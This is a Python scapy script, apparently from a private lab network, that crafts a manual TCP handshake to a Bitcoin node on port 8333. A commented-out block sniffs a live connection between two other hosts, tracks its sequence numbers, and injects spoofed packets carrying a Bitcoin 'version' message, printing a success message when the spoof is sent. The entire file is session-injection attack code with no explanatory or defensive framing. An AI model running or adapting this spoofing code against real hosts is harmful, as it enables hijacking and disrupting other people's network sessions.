from scapy.all import *
a = " "

src = "10.0.2.11"
dst = "10.0.2.12"
sport = 11111 #random.randint(1024,65535)
dport = 8333
seq = 3587496741#random.randint(1587496741,9587496741)
ack = 0
pld_VERSION = '\xf9\xbe\xb4\xd9version\x00\x00\x00\x00\x00\x00\x00\x00\x00]\xf6\xe0\xe2'

#SYN
ip = IP(src = src, dst = dst)
SYN = TCP(sport=sport, dport=dport, flags='S', seq = seq)
##send(ip/SYN)
SYNACK = sr1(ip/SYN)


#SYN-ACK
ACK = TCP(sport=sport, dport=dport, flags='A', seq=SYNACK.ack, ack=SYNACK.seq+1)
send(ip/ACK)
#FINACK=sr1(ip/ACK)
'''
#Bitcoin version
#tcp = TCP(sport=sport, dport=dport, flags='PA', seq=FINACK.ack, ack=FINACK.seq+1)
tcp = TCP(sport=sport, dport=dport, flags='PA', seq=ACK.seq+1, ack=ACK.ack)
VERACK = sr1(ip/tcp/pld_VERSION)
'''

'''
def pkt_callback(pkt):
    src = "10.0.2.12"
    dst = "10.0.2.7"
    sport = " "
    dport = " "
    seq = 0
    ack = 0
    pld_VERSION = '\xf9\xbe\xb4\xd9version\x00\x00\x00\x00\x00\x00\x00\x00\x00]\xf6\xe0\xe2'
    ip = IP(src = src, dst = dst)

    #if pkt[IP].src == "10.0.2.15" and pkt[IP].dst == "10.0.2.7":
       #pkt.show()
    try:
          if pkt[IP].src == "10.0.2.12" and pkt[IP].dst == "10.0.2.7" and pkt[TCP].payload:
             pkt.show()
             print("!!!!! outbound session, flags:", pkt[TCP].flags)
          elif pkt[IP].src == "10.0.2.12" and pkt[IP].dst == "10.0.2.7" and pkt[TCP].flags == 16L:
             pkt.show()
             print("!!!!! outbound session, flags:", pkt[TCP].flags)            
             sport = pkt[TCP].sport
             dport = pkt[TCP].dport
             #synchronize the seq and ack
             if seq < pkt[TCP].seq or seq == pkt[TCP].seq:
                seq = pkt[TCP].seq
                #print("$$$seq:", seq)
             if ack < pkt[TCP].ack or ack == pkt[TCP].ack:
                ack = pkt[TCP].ack
                #print("!!!!ack:", ack)
             #construct the pkt_spoof
             tcp = TCP(sport=sport, dport=dport, flags='PA', seq=seq, ack =ack)
             pkt_spoof = ip/tcp/pld_VERSION
             print(pkt_spoof)
             send(pkt_spoof)
             print("!!!!  $p00f scceeds!")
          elif pkt[IP].dst == "10.0.2.12" and pkt[IP].src == "10.0.2.7" and pkt[TCP].payload:
             pkt.show()
             print("!!!!! inbound session, flags:", pkt[TCP].flags)
             sport = pkt[TCP].dport
             dport = pkt[TCP].sport
             seq = pkt[TCP].ack
             ack = pkt[TCP].seq + 35
             tcp = TCP(sport=sport, dport=dport, flags='A', seq=seq, ack =ack)
             pkt_spoof = ip/tcp
             print(pkt_spoof)
             send(pkt_spoof)
             print("!!!! reply ack")
    except:
           pass
       

sniff(iface="enp0s3",prn=pkt_callback, filter="tcp", store=1)
'''
